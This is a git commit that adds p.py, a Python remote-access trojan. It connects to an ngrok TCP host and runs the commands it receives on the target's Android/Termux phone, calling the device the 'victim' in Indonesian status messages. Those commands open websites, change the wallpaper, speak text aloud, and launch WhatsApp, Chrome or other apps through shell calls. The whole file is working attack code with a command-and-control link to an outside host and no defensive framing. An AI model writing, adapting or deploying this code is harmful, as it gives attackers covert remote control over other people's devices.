1a29d2a862da746d56ebbce269a45b2835a042de
Rezza Priatna <58212770+rezzaapr@users.noreply.github.com>
2022-01-13 02:28:46 +0700

    Create p.py

---
+++ p.py
@@ -0,0 +1,52 @@
+import socket
+import threading
+import os, sys
+
+def trojan():
+ 	HOST = '0.tcp.ngrok.io'
+ 	PORT = 14967
+
+ 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 	client.connect((HOST, PORT))
+
+
+ 	while True:
+ 		server = client.recv(1024).decode('utf-8')
+ 		if server == "help":
+ 			client.send(f"".encode("utf-8"))
+ 		elif server == "web-open https://nekopoi.care":
+ 			os.popen('xdg-open https://nekopoi.care')
+ 			client.send(f"Senter Sudah Menyala Di Hp Taget".encode("utf-8"))
+ 		elif server == 'walpaper':
+ 			os.popen('termux-wallpaper -u '+server[7:])
+ 		elif "tts" in server:
+ 			os.popen('termux-tts-speak '+server[4:])
+ 			client.send(f"Membunyikan TTS {server[4:]}".encode("utf-8"))
+ 		elif 'run app' == server:
+ 			client.send(f'Use run app -l to view supported app'.encode("utf-8"))
+ 		elif 'run app -l' == server:
+ 			client.send(f'List Apps\n=====\nchrome\nwhatsapp\n\n Atau Kamu Bisa Menjalnkan Aplikasi Lain, Gunakan Aplikasi Current Activity untuk Melihat package name app dan Activity\n\n\nContoh run com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity'.encode("utf-8"))
+ 		elif 'run app whatsapp' == server or 'run app Whatsapp' == server:
+ 			os.popen('am start --user 0 -n com.whatsapp/com.whatsapp.HomeActivity')
+ 			client.send(f'Succes Membuka whatsapp Di Hp Korban'.encode("utf-8"))
+ 		elif 'run app chrome' == server:
+ 			os.popen('am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main')
+ 			client.send(f'Succes Membuka chrome Di Hp Korban'.encode("utf-8"))
+ 		elif 'run app mobile-legend' == server:
+ 			os.popen('am start --user 0 -n com.mobile.legends/com.moba.unityplugin.MobaGameUnityActivity')
+ 			client.send(f'Succes Membuka mobile-legend di hp Korban'.encode("utf-8"))
+ 		elif 'run' == server:
+ 			os.popen('am start --user 0 -n '+server[3:])
+
+
+
+
+ 		else:
+ 			continue
+ 			client.send(f"Command Tidak Dikenal Ketik Menu Untuk Menampilkan".encode("utf-8"))
+
+
+
+
+t = threading.Thread(target=trojan)
+t.start()
